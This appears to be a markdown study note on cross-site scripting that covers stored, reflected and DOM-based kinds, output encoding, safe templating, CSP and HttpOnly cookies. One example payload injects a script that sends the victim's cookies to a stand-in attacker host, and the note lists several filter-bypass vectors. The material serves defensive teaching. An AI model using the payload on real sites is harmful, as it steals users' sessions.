# XSS (Cross-Site Scripting)

- Attacker gets the victim's browser to run JS in the target site's origin
- Access to: cookies (if not `HttpOnly`), localStorage, DOM, any authenticated API

## Kinds

- `Stored` — payload saved on server, served to every viewer
- `Reflected` — payload in request, echoed back; requires a crafted link
- `DOM-based` — vulnerable client JS reads from `location.hash` and writes to `innerHTML`

```html
<!-- server renders user.bio without escaping -->
<div>Bio: {{ user.bio }}</div>

<!-- attacker sets bio to: -->
<script>fetch('https://evil.com/?c=' + document.cookie)</script>
```

## Prevention

1. **Context-aware output encoding** at the point of output
    - HTML body → escape `< > & " '`
    - HTML attribute → escape + quote
    - JS context → JSON-encode, never interpolate
    - URL → `encodeURIComponent`
1. **Auto-escaping templates** — Jinja2, Django, React JSX. Trouble: `|safe`, `dangerouslySetInnerHTML`, `v-html`
1. **Avoid sinks** — `innerHTML`, `document.write`, `eval`, `new Function`
1. **Sanitize rich HTML** — `DOMPurify` if you must accept HTML
1. **[CSP](security-headers.md)** — blocks inline / foreign scripts as defense in depth
1. **`HttpOnly` cookies** — JS can't read the session cookie

## Don't rely on

- Input validation / blacklisting — `<img onerror>`, `<svg onload>`, `javascript:` all work. Encode on output
- HTTPS / WAF — irrelevant; payload is stored as data and rendered as code
